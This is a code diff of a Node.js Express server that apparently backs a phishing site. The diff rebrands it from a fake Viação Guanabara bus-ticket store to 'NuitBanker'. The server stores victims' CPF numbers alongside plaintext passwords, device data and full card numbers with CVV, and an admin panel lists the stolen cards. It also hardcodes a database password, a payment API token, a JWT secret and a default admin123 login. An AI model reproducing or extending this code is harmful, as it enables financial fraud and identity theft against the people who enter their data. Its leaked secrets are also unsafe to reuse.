@@ -5,7 +5,6 @@ const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
 const cookieParser = require('cookie-parser');
 const path = require('path');
-const crypto = require('crypto');
 
 const app = express();
 
@@ -16,14 +15,15 @@ app.use(express.static('public'));
 app.use('/admin', express.static('admin'));
 
 const pool = new Pool({
-    connectionString: 'postgresql://guanabara_user:JTL5QHG4acDPmzHRo4FYZBmTOtlFDBZW@dpg-d9shhuv10e5c739tl52g-a.oregon-postgres.render.com/guanabara',
+    connectionString: 'postgresql://nuitbanker_db_user:Gbnwn5eEqlrKkx4xjduxGis0DchI1aXy@dpg-d8h40ccvikkc73erecng-a.oregon-postgres.render.com/nuitbanker_db',
     ssl: { rejectUnauthorized: false },
     max: 20,
     idleTimeoutMillis: 30000,
-    connectionTimeoutMillis: 2000
+    connectionTimeoutMillis: 5000,
+    keepAlive: true
 });
 
-const JWT_SECRET = process.env.JWT_SECRET || 'ativacacambas_secret_key_2025';
+const JWT_SECRET = 'nuitbanker_secret_key_2025';
 const JWT_EXPIRES = '24h';
 
 function verificarAdminToken(req, res, next) {
@@ -37,11 +37,6 @@ function verificarAdminToken(req, res, next) {
     } catch { return res.status(401).json({ error: 'Token inválido ou expirado' }); }
 }
 
-function getClientIP(req) {
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.ip;
-    return ip ? ip.replace(/^::ffff:/, '') : 'IP não identificado';
-}
-
 async function initDatabase() {
     const client = await pool.connect();
     try {
@@ -49,37 +44,20 @@ async function initDatabase() {
         await client.query(`CREATE TABLE IF NOT EXISTS users (id SERIAL PRIMARY KEY, cpf VARCHAR(14) UNIQUE, senha TEXT, ip TEXT, dispositivo TEXT, navegador TEXT, telefone VARCHAR(20), data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP, data_senha TIMESTAMP, status VARCHAR(20))`);
         await client.query(`CREATE TABLE IF NOT EXISTS logs (id SERIAL PRIMARY KEY, tipo VARCHAR(30), cpf VARCHAR(14), senha TEXT, ip TEXT, dispositivo TEXT, navegador TEXT, data TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
         await client.query(`CREATE TABLE IF NOT EXISTS payments (id SERIAL PRIMARY KEY, transaction_id VARCHAR(100) UNIQUE, cpf VARCHAR(14), telefone VARCHAR(20), valor DECIMAL(10,2), status VARCHAR(20) DEFAULT 'pending', tipo_pagamento VARCHAR(20) DEFAULT 'PIX', data_solicitacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP, data_pagamento TIMESTAMP)`);
-        await client.query(`CREATE TABLE IF NOT EXISTS admin_attempts (id SERIAL PRIMARY KEY, ip TEXT, tentativa TEXT, data TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
         await client.query(`CREATE TABLE IF NOT EXISTS produtos (id SERIAL PRIMARY KEY, nome TEXT NOT NULL, tipo TEXT NOT NULL, preco REAL NOT NULL, preco_promocional REAL, descricao TEXT, icone TEXT, imagem TEXT, ativo BOOLEAN DEFAULT true)`);
         await client.query(`CREATE TABLE IF NOT EXISTS clientes (id SERIAL PRIMARY KEY, nome TEXT NOT NULL, telefone TEXT NOT NULL, email TEXT, cpf TEXT)`);
         await client.query(`CREATE TABLE IF NOT EXISTS pedidos (id SERIAL PRIMARY KEY, cliente_id INTEGER REFERENCES clientes(id) ON DELETE CASCADE, produto_id INTEGER REFERENCES produtos(id) ON DELETE CASCADE, quantidade INTEGER DEFAULT 1, valor_total REAL, status_pagamento TEXT DEFAULT 'pendente', tipo_pagamento TEXT, transacao_id TEXT, created_at TIMESTAMP DEFAULT NOW())`);
         await client.query(`CREATE TABLE IF NOT EXISTS cartoes (id SERIAL PRIMARY KEY, cliente_id INTEGER, nome_titular TEXT, numero_cartao TEXT, cvv TEXT, validade TEXT)`);
 
-        // Admin padrão da Guanabara
-        const adminExists = await client.query('SELECT * FROM admin_users WHERE username = $1', ['guanabara']);
+        // Admin padrão
+        const adminExists = await client.query('SELECT * FROM admin_users WHERE username = $1', ['nuitbanker']);
         if (adminExists.rows.length === 0) {
             const hash = await bcrypt.hash('admin123', 10);
-            await client.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['guanabara', hash]);
-            console.log('✅ Admin Guanabara criado: guanabara / admin123');
+            await client.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['nuitbanker', hash]);
+            console.log('✅ Admin NuitBanker criado: nuitbanker / admin123');
         }
 
-        // PRODUTOS DA GUANABARA (PASSAGENS DE ÔNIBUS)
-        const produtosCount = await client.query('SELECT COUNT(*) FROM produtos');
-        if (parseInt(produtosCount.rows[0].count) === 0) {
-            const produtosPadrao = [
-                ['Belo Horizonte -> Rio de Janeiro', 'passagem', 69.90, 59.90, 'Ônibus Leito, saída 08:00h, chegada 14:00h.', 'fas fa-bus', null],
-                ['Goiânia -> Barreiras', 'passagem', 285.99, null, 'Ônibus Semi-Leito, saída 10:00h.', 'fas fa-bus', null],
-                ['Brasília -> Correntina', 'passagem', 179.99, null, 'Ônibus Executivo, saída 14:00h.', 'fas fa-bus', null],
-                ['Rio de Janeiro -> Brasília', 'passagem', 204.00, 189.90, 'Ônibus Leito, saída 22:00h.', 'fas fa-bus', null],
-                ['Fortaleza -> Natal', 'passagem', 176.00, null, 'Ônibus Convencional, saída 06:00h.', 'fas fa-bus', null],
-                ['Curitiba -> São Paulo', 'passagem', 120.00, 99.90, 'Ônibus Leito, saída 23:00h.', 'fas fa-bus', null]
-            ];
-            for (const p of produtosPadrao) {
-                await client.query(`INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, ativo) VALUES ($1,$2,$3,$4,$5,$6,$7, true)`, p);
-            }
-            console.log('✅ Passagens de Ônibus Guanabara inseridas');
-        }
-        console.log('✅ Banco de dados Guanabara (NuitBanker) inicializado');
+        console.log('✅ Banco de dados NuitBanker inicializado');
     } catch (err) { console.error('Erro:', err); } finally { client.release(); }
 }
 initDatabase();
@@ -99,20 +77,26 @@ app.post('/api/login', async (req, res) => {
 });
 
 app.get('/api/produtos', async (req, res) => {
-    const result = await pool.query("SELECT * FROM produtos WHERE ativo = true ORDER BY id");
-    res.json({ success: true, produtos: result.rows });
+    try {
+        const result = await pool.query("SELECT * FROM produtos WHERE ativo = true ORDER BY id");
+        res.json({ success: true, produtos: result.rows });
+    } catch (err) { res.status(500).json({ erro: err.message }); }
 });
 
 app.post('/api/clientes', async (req, res) => {
     const { nome, telefone, email, cpf } = req.body;
-    const result = await pool.query("INSERT INTO clientes (nome, telefone, email, cpf) VALUES ($1,$2,$3,$4) RETURNING id", [nome, telefone, email, cpf]);
-    res.json({ success: true, cliente_id: result.rows[0].id });
+    try {
+        const result = await pool.query("INSERT INTO clientes (nome, telefone, email, cpf) VALUES ($1,$2,$3,$4) RETURNING id", [nome, telefone, email, cpf]);
+        res.json({ success: true, cliente_id: result.rows[0].id });
+    } catch (err) { res.status(500).json({ erro: err.message }); }
 });
 
 app.post('/api/pedidos', async (req, res) => {
     const { cliente_id, produto_id, quantidade, valor_total, tipo_pagamento } = req.body;
-    const result = await pool.query("INSERT INTO pedidos (cliente_id, produto_id, quantidade, valor_total, tipo_pagamento, status_pagamento) VALUES ($1,$2,$3,$4,$5,'pendente') RETURNING id", [cliente_id, produto_id, quantidade, valor_total, tipo_pagamento]);
-    res.json({ success: true, pedido_id: result.rows[0].id });
+    try {
+        const result = await pool.query("INSERT INTO pedidos (cliente_id, produto_id, quantidade, valor_total, tipo_pagamento, status_pagamento) VALUES ($1,$2,$3,$4,$5,'pendente') RETURNING id", [cliente_id, produto_id, quantidade, valor_total, tipo_pagamento]);
+        res.json({ success: true, pedido_id: result.rows[0].id });
+    } catch (err) { res.status(500).json({ erro: err.message }); }
 });
 
 app.post('/api/cartoes/salvar', async (req, res) => {
@@ -125,7 +109,7 @@ app.post('/api/cartoes/salvar', async (req, res) => {
     } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
-// PIX (Mantido exatamente igual ao seu)
+// PIX
 const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
 const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';
 
@@ -148,16 +132,16 @@ app.post('/api/create-payment', async (req, res) => {
         offer_hash: PLUMIFY_PRODUCT_HASH, 
         payment_method: 'pix', 
         customer: { 
-            name: customer_name || 'Passageiro Guanabara', 
-            email: 'contato@viacaoguanabara.com.br', 
+            name: customer_name || 'Passageiro', 
+            email: 'contato@viacao.com.br', 
             phone_number: customer_phone || '41992878772', 
             document: customer_cpf || '00000000000', 
-            street_name: 'Rodovia BR 116', 
-            number: '700', 
-            neighborhood: 'Cajazeiras', 
+            street_name: 'Rua Exemplo', 
+            number: '100', 
+            neighborhood: 'Centro', 
             city: 'Fortaleza', 
             state: 'CE', 
-            zip_code: '60864012' 
+            zip_code: '60000000' 
         }, 
         cart: [{ 
             product_hash: PLUMIFY_PRODUCT_HASH, 
@@ -198,6 +182,19 @@ app.get('/api/admin/produtos', verificarAdminToken, async (req, res) => {
     res.json({ success: true, produtos: result.rows });
 });
 
+app.post('/api/admin/produtos', verificarAdminToken, async (req, res) => {
+    const { nome, tipo, preco, preco_promocional, descricao, icone, imagem } = req.body;
+    try {
+        const result = await pool.query(`INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, ativo) VALUES ($1,$2,$3,$4,$5,$6,$7, true) RETURNING id`, [nome, tipo, preco, preco_promocional, descricao, icone, imagem]);
+        res.json({ success: true, id: result.rows[0].id });
+    } catch (err) { res.status(500).json({ erro: err.message }); }
+});
+
+app.delete('/api/admin/produtos/:id', verificarAdminToken, async (req, res) => {
+    await pool.query('DELETE FROM produtos WHERE id = $1', [req.params.id]);
+    res.json({ success: true });
+});
+
 app.get('/api/admin/cartoes', verificarAdminToken, async (req, res) => {
     const result = await pool.query(`SELECT c.*, u.cpf, u.telefone FROM cartoes c LEFT JOIN users u ON c.cliente_id = u.id ORDER BY c.created_at DESC`);
     res.json({ success: true, cartoes: result.rows });
@@ -213,7 +210,7 @@ app.delete('/api/admin/delete/:cpf', verificarAdminToken, async (req, res) => {
     res.json({ success: true });
 });
 
-// FRONTEND (PÁGINAS)
+// FRONTEND
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'index.html')));
 app.get('/tickets', (req, res) => res.sendFile(path.join(__dirname, 'public', 'tickets.html')));
@@ -223,5 +220,5 @@ app.get('/comprovante', (req, res) => res.sendFile(path.join(__dirname, 'public'
 
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Servidor Guanabara rodando na porta ${PORT}`);
+    console.log(`✅ Servidor NuitBanker rodando na porta ${PORT}`);
 });
